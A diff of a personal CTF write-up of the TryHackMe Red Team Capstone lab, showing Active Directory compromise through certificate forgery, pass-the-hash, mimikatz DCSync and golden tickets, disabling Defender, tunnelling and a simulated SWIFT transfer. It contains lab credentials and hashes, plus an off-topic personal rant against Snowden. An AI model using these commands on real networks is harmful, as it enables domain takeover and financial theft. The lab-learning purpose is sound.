@@ -5,7 +5,7 @@ Date:
 Difficulty:  Hard
 Goals:  
 - Red Teaming with the any Community 
-	- Subbed to 0xTiberious, Tyler Ramsbey
+	- Subbed to 0xTib3rious, Tyler Ramsbey
 	- Joined the Work Harder Group
 - Get as many feasible perspectives and tricks
 - Watch the speed run 
@@ -24,7 +24,7 @@ Learnt:
 - Multiple Ways means Multiple bypasses to other users
 - Cyber-Cold-Warfare with the rest of the community
 - RDP inception gets a bit silly - forgetting that you are connecting back on yourself for fifth layer when you already have a session  
-- My inituitive builtin PrivEsc Locally is tacticool is not strategical relevant, beware the unthinking. AD escalation and laterally movement, before Local Privilege Escalation is always a reduction in time to objective.
+- My intuitive builtin PrivEsc Locally is tacticool is not strategical relevant, beware the unthinking. AD escalation and laterally movement, before Local Privilege Escalation is always a reduction in time to objective.
 
 
 ![](october.png)
@@ -52,7 +52,7 @@ General disclaimers,
 - [Alh4zr3d3 - Youtube](https://www.youtube.com/@alh4zr3d3) / [alh4zr3d3 - Twitch](https://www.twitch.tv/videos/1817405607) 
 	- Self-Description: *"I am a professional penetration tester, red teamer, CTF player, and all-around hacker who enjoys sharing his dissociated knowledge and tainted magicks with the greater infosec community as well as drawing new members to the crazed, esoteric cult of hacking."*
 - [0xTib3rius - Youtube](https://www.youtube.com/@Tib3rius) / [0xTib3rius - Twitch](https://www.twitch.tv/0xtib3rius)
-	- Self-Description: *"I am a professional penetration tester, specializing in web application security. I wrote [AutoRecon](https://github.com/tib3rius/AutoRecon), a tool for enumerating boot2root style boxes, and I have created two Privilege Escalation courses on [Udemy](https://udemy.com/user/Tib3rius)."*
+	- Self-Description: *"I am a professional penetration tester, specialising in web application security. I wrote [AutoRecon](https://github.com/tib3rius/AutoRecon), a tool for enumerating boot2root style boxes, and I have created two Privilege Escalation courses on [Udemy](https://udemy.com/user/Tib3rius)."*
 - [Tyler Ramsbey - Youtube](https://www.youtube.com/@TylerRamsbey) / [hack_smarter Twitch](https://www.twitch.tv/hack_smarter) 
 	- Self-Description: *"I post videos on cybersecurity, education, leadership, and all things pertaining to the world of IT!"*
 	- [Full Youtube playlist](https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-)
@@ -412,11 +412,11 @@ The svcScanning spn is crackable
 
 ![](bigbypass.png)
 
-- Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presumable that either previous compromises would have left artefacts. I later learn that as cool a feature as this is this would probably fire of the entire SOC team into making sustained wee-woo-wee-woo noises before saying got-him to each other while would have had to bury my curiosity and excitement. Thankfully no alerts or EDR or Windows Defender just an empty .dmp file to exfiltrate out just to test what can leave the network.
+ Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presumable that either previous compromises would have left artefacts. I later learn that as cool a feature as this is this would probably fire of the entire SOC team into making sustained wee-woo-wee-woo noises before saying got-him to each other while would have had to bury my curiosity and excitement. Thankfully no alerts or EDR or Windows Defender just an empty .dmp file to exfiltrate out just to test what can leave the network.
 
 #### Sliver reading and watching 
 
-[Thanks to Cyber attack & defense](https://www.youtube.com/watch?v=izMMmOaLn9g)  for great breakdown of sliver for red and blue teams.
+[Thanks to Cyber attack & defence](https://www.youtube.com/watch?v=izMMmOaLn9g)  for great breakdown of sliver for red and blue teams.
 ```go
 // Display help
 help <command>
@@ -880,15 +880,7 @@ gpupdate /force
 The horror...
 ![](powerlevelisover9000.png)
 
-## EDIT FROM HERE
-
-
-In the face BadOpsec of this I want to also make:
-- Silver Tickets
-- Golden Tickets
-- Golden Certs if time.
-
-In interim research and resets, rebuilds and redeployment I documented... 
+In the interim research and resets, rebuilds and redeployment I documented... 
 
 #### Manual CS Abuse
 
@@ -936,15 +928,14 @@ certipy-ad cert -export -pfx $forgedAdmin.pfx -password "yourpassword" -out "unp
 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx unprotected.pfx
 ```
 
+#### Viewing the other ways...
 
-[Tyler](https://www.youtube.com/watch?v=xzxpn6k7OIQ) demonstrates we could also use `evil-winrm` and the hash from the dc-sync to remote into the dc through pass-the-hash 
+[Tyler](https://www.youtube.com/watch?v=xzxpn6k7OIQ) demonstrates we could also use `evil-winrm` and the hash from the dc-sync to remote into the dc through pass-the-hash.
 ```bash
 proxychains evil-winrm -i 10.200.116.102 -u Administrator -H 'd3d4edcc015856e386074795aea86b3e'
 ```
 
-#### Catching up on Email
-
-Messages from Am03baM4n
+Catching up on Email some more messages from Am03baM4n
 ![](messagefromAmoebaman3.png)
 
 Server Alert..
@@ -958,9 +949,7 @@ DC has fallen
 
 #### Golden Tickets with Tyler
 
-Domain Trust Exploitation
-
-[Tyler](https://www.youtube.com/watch?v=Td_Krk1S3yg) did:
+After review the Tryhackme Red Team module material on Domain Trust Exploitation [Tyler](https://www.youtube.com/watch?v=Td_Krk1S3yg) did 
 ```powershell
 proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.116.102
 Set-MpPreference -DisableRealTimeMonitoring $true
@@ -1015,7 +1004,7 @@ IoC: `wmic` mounts and writes output to `ADMIN$` share by default.
 -share $SHARE -silentcommand
 ```
 
-
+More
 ```bash
 proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.102 -u 'NVM2' -p 'p@ssw0rd1!'
 ```
@@ -1025,6 +1014,7 @@ How to traverse a Bidirectional trust.
 ![](bidreictionaltrust.png)
 
 ```powershell
+Get-ADTrust -Filter*
 Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
 ```
 
@@ -1238,11 +1228,11 @@ While I recompile everything again re-watched the talk discussed in the SWIFT co
 	- API keys and passwords
 - Plant Web shells
 - dump WIFI and VPN configurations
-- Jake's favourite share - the weirdly named public share; these are created to dump data to bypass the lengthy time intralegally to creation of a security group for business-to-business contractors that need access.  
+- Jake's favourite share - the weirdly named public share; these are created to dump data to bypass the lengthy time intra-legally to creation of a security group for business-to-business contractors that need access.  
 
 #### Continue to the final Flags today
 
-Firstly had issues with another users on various subnets till I found one although my original ways to the CORPDC were main uninhibited, certutil as dropper was not working, but I just side step this with WindRM as I had begun reading the [0xb0b writeup](https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge/full-compromise-of-parent-domain), which pointed this out.
+Firstly had issues with another users on various subnets till I found one although my original ways to the CORPDC were main uninhibited, `certutil` as dropper was not working, but I just side step this with WinRM as I had begun reading the [0xb0b writeup](https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge/full-compromise-of-parent-domain), which pointed this out.
 
 Firstly a realisation already expressed that I failed to handle the domains correctly in my decision making
 ![](thecorrectadminaccount.png)
@@ -1310,9 +1300,7 @@ kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-1
 ![](krbtgtondc.png)
 Then first golden ticket creation
 ![](goldenticketnumone.png)
-Unfortunately this did not work for me possibly the other user on my lab network is using a different forge ticket to impersonate the administrator user and then psexecing into the rootdc or bankdc. I am being blocked by another user almost certainly. 
-
-Prepping everything to power-through to dropping beacons on both `rootdc`, `jmp` and `bankdc` before anyone can block the way. It also seems like everyone is using the same way in.
+Unfortunately this did not work for me possibly the other user on my lab network is using a different forge ticket to impersonate the administrator user and then psexecing into the rootdc or bankdc. I am being blocked by another user almost certainly. Prepping everything to power-through to dropping beacons on both `rootdc`, `jmp` and `bankdc` before anyone can block the way. It also seems like everyone is using the same way in.
 ```powershell
 # Players changed a hash, beware
 # Got hash for 'administrator@corp.thereserve.loc': # 
@@ -1372,15 +1360,12 @@ token::elevate
 lsadump::dcsync /user:corp\krbtgt
 lsadump::lsa /patch
 
-# 
+# Create a golden ticket again
 kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
 # Paste details into each from template above
 kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
 
-
-
-
-
+# Psexec in and fail...
 .\Psexec64.exe \\rootdc.thereserve.loc powershell.exe
 
 # this does not work
@@ -1391,9 +1376,6 @@ Add-ADGroupMember -Identity "Enterprise Admins" -Members "NVM2_EA"
 Enable-ADAccount -Identity NVM2_EA
 net localgroup "Administrators" NVM2_EA /add 
 gpupdate /force
-
-
-
 
 Set-MpPreference -DisableRealTimeMonitoring $true
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
@@ -1444,9 +1426,7 @@ gpupdate /force
 Quick proof
 ![](weareontherootdc.png)
 
-During this process I had to extend this network at the 2 minute mark!!!  
-
-This was as awesome enough to add lighting of the beacons from [LOTR](https://www.youtube.com/watch?v=i6LGJ7evrAg) as reference here.
+During this process I had to extend this network at the 2 minute mark!!! This was as awesome enough to add lighting of the beacons from [LOTR](https://www.youtube.com/watch?v=i6LGJ7evrAg) as reference here.
 ![](allthreebeacons.png)
 
 Researching how to substitute `chisel` with `sliver`
@@ -1454,6 +1434,7 @@ Researching how to substitute `chisel` with `sliver`
 
 ## Compromise of SWIFT and Payment Transfer
 
+To get this finished within the evening I went for 
 ![](messagefromAmoebaman7.png)
 
 First trying myself
@@ -1468,6 +1449,7 @@ First trying myself
 [ChromiumKeyDump] Masterkey: GfdBhFf6+bnnBJbDEm0NaRdhKvqyQHvdBJwgZqY5950=
 ```
 
+And dumping any hashes from JMP computer
 ```c
 privilege::debug
 log
@@ -1476,7 +1458,6 @@ token::elevate
 # We are DA so
 lsadump::dcsync /user:corp\krbtgt
 lsadump::lsa /patch
-
 ```
 
 Requires two users - One for the memes has to be Emily. 
@@ -1499,23 +1480,17 @@ a.turner
 # dump credentials with the beacon
 ```
 
+A note states website hosted on the swift.bank.thereserve.loc domain.
 ![](swiftbankaccess.png)
 
-So Swift, I remember swift from...
+So Swift, I remember swift from... [DonnchaC](https://github.com/DonnchaC/shadowbrokers-exploits/tree/master/swift) whom I would disagree with on various topics and is hosting one of the dumps of ShadowBrokers. On privacy as regards to managing and maintaining the Open Free Western Internet - a la Dan Kiminsky - would I think that the best rebuttal Donncha and other privacy advocates of my generation given in [Going Dark - effective modern site security is behavioural in nature | Paul Vixie](https://www.youtube.com/watch?v=ZGiK44Gyryc). I personally think that part of the problem that 2010-20s is that most sources of information is the "world" is continuously getting worse month-by-month. A narrative that then makes privacy advocates alarmed at Government Surveillance, like Paul Vixie's argument - I too knew that institutions have always spied on everything and everyone in every way they possibly can and always done so and will always do so in the last 4000 years and into the next 4000 years.  On the other hand we need [DonnchaC](https://github.com/DonnchaC/shadowbrokers-exploits/tree/master/swift)  and the publication of data like this as actually it has probably improved defences across the Democratic West and kept more people safe at home and work. Also Donnacha's Opsec failures during his black hat days highlighted in [a Grupq talk](https://www.youtube.com/watch?v=9XaYdCdwiWU) can teach us a lot about information, security operations and game theory. 
 
-...Reading Equation group dumps from malicious insider, useful Russian-idiot and propagator of paranoia Edward Snowden on Github. As an idiot swept up on the most vulnerable sidelines of that entire global tit-for-tat information war my very personal gripe with Snowden, Russian information war, Alex Jones and the like is the damage that it did to me. I shunned friends and community, did not live to my full, worsened my mental health and did not pursue alternatives ways rise above. Given looking back on almost a decade of this and my overcoming of it and my personally triumph that no other human in the last ten years or hundred thousand will ever match - my finger of blame is lies and all that propagate them. I will a very very long time, probably long enough till most of this is just so long forgotten. I have lived in a constant hunger to be whole and free, which was happened by those events as part of the root cause. I am now both and eternal, waiting and building. I now have patience to understand all the above and the horrors it wrought on me and what it probably did to everyone else. As far as I am concerned it goes down in history as Snowden's actual ethical down fall. I look forward to seeing the horror in his face and the those that orchestrated this. Even an actual analyst demonstrating pure narrow minded arrogance to lie to a world that the danger was the collapse of privacy and somehow new. This ultimately spur on fear, anti-intellectualism, regressive and nationalist politics, destruction of communities and science over nonsense, diplomacy.  These criminal held us all back across the global, when the fall of eventual Russia occurs I will be very happy and hopeful help propagate a public voice to argue that Snowden and all the operatives involved deserve life sentence. They will deserve it they are criminal that has actuated events that have damaged humanity globally and they have lived almost decade in Russian opulence. I have ten years of suffering unanswered then next ten years will be like the sunrise across the world.
+...Reading some of Equation group dumps from malicious insider, useful Russian-idiot and propagator of paranoia Edward Snowden on Github. As an idiot swept up on the most vulnerable sidelines of that entire global tit-for-tat information war my very personal gripe with Snowden, Russian information war, Alex Jones and the like is the damage that it did to me. I shunned friends and community, did not live to my full, worsened my mental health and did not pursue alternatives ways rise above. Given looking back on almost a decade of this and my overcoming of it and my personally triumph that no other human in the last ten years or hundred thousand will ever match - my finger of blame is lies and all that propagate them. I will a very very long time, probably long enough till most of this is just so long forgotten. I have lived in a constant hunger to be whole and free, which was happened by those events as part of the root cause. I am now both and eternal, waiting and building. I now have patience to understand all the above and the horrors it wrought on me and what it probably did to everyone else. As far as I am concerned it goes down in history as Snowden's actual ethical down fall. I look forward to seeing the horror in his face and the those that orchestrated this. Even an actual analyst demonstrating pure narrow minded arrogance to lie to a world that the danger was the collapse of privacy and somehow new. This ultimately spur on fear, anti-intellectualism, regressive and nationalist politics, destruction of communities and science over nonsense, diplomacy.  These criminal held us all back across the global, when the fall of eventual Russia occurs I will be very happy and hopeful help propagate a public voice to argue that Snowden and all the operatives involved deserve life sentence. They will deserve it they are criminal that has actuated events that have damaged humanity globally and they have lived almost decade in Russian opulence. I have ten years of suffering unanswered then next ten years will be like the sunrise across the world.
 
 Before the argument enters a brain that Snowden me being here writing this, here is [Jake Williams discussing Shadow Brokers](https://www.youtube.com/watch?v=xuUMlNx72xI) and this is were I learnt that you could actually look at that stuff and not go to prison and you never would have if you did or has any of the account that hosted the dumps. The good thing is that I read the dumps and enjoyed the cool capabilities. There was a lot of Swift usage in the dumps, which seemed like what it would be like being an accountant whereas I was learning about Digital Forensics again and learning about Logging on Windows, because AZ 104's *here is your 1 week worth of logs"* seemed nuts to me... Thanks Jake for the idea of Hunting an example of dealing with the negative space, ducks and bread, the explanations, inspiration and the humour.
 
 ```swift
 7f5e73f6-f4a0-4622-bc1b-d75894704524
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
-Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
 Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
 
 In order to proof that you have access to the SWIFT system, dummy accounts have been created for you and you will have to perform the following steps to prove access.
@@ -1540,9 +1515,10 @@ Using these details, perform the following steps:
 5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).
 ```
 
+Confirmation!
 ![](threemoretogo.png)
 
-At this point aI decided to watch [Alh4zr3d started in a rough state and completed this and I hope he feels amazing after this and all the best to the engagement](https://www.twitch.tv/videos/1835142922), but I am going to rewatch this for the finale. 
+At this point I decided to watch [Alh4zr3d started in a rough state and completed this and I hope he feels amazing after this and all the best to the engagement](https://www.twitch.tv/videos/1835142922), but I am going to rewatch this for the finale. 
 
 ```swift
 In order to proof that you have capturer access to the SWIFT system, a dummy transaction has been created for you.
@@ -1557,6 +1533,7 @@ Look for this transfer and capture (forward) the transaction.
 C:young : Password!
 ```
 
+We have custom groups 
 ![](alnetgroupforpaymentcapturesandapprovers.png)
 
 Displaying the users of these groups
@@ -1570,7 +1547,6 @@ r.davies  90a12d9dab5cd7b826964e169488d8e9
 `C.young : Password!`
 
 DC syncing the `bankdc`
-
 ![](aturnerhash.png)
 
 |Hash|Type|Result|
@@ -1596,6 +1572,7 @@ It is a JWT!
 But Al and I were not reading
 ![](forwardthisidiot.png)
 
+More emails..
 ```
 In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created for you.
 
@@ -1626,6 +1603,7 @@ But Password! is fine
 
 ![](aliceisturning.png)
 
+And final email1
 ```
 Checking swift full
 
@@ -1674,9 +1652,10 @@ Part 3 of wiring money 101
 ![](approvable.png)
 And Alice says yes to wiring 10 million dollars
 ![](YESALICEAPproVEtheWIRE.png)
-## Beyond Rooting Everything
 
-- https://www.youtube.com/watch?v=FRUQMg9IhMA -ntlm relay for server 1
+## EDIT FROM HERE
+
+## Beyond Rooting Everything
 
 - Patch the way in theoretically to avoid ToU
 - Add a backdoor to custom source code theoretically to avoid ToU - swift backdoor
@@ -1725,8 +1704,9 @@ nohup ./chisel client 10.200.116.12:20002 R:127.0.0.1:20002:socks &
 
 ![](congrats.png)
 
-And Surpassing SuitGuy
+And Surpassing SuitGuy, which I remember from when I first started.
 ![](suppacingsuitguy.png)
+
 ## References - dont add just read and script a references section
 
 READ FIRST
@@ -1740,6 +1720,7 @@ https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/
 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire
 https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
+https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/
 
 ## Appendix
 
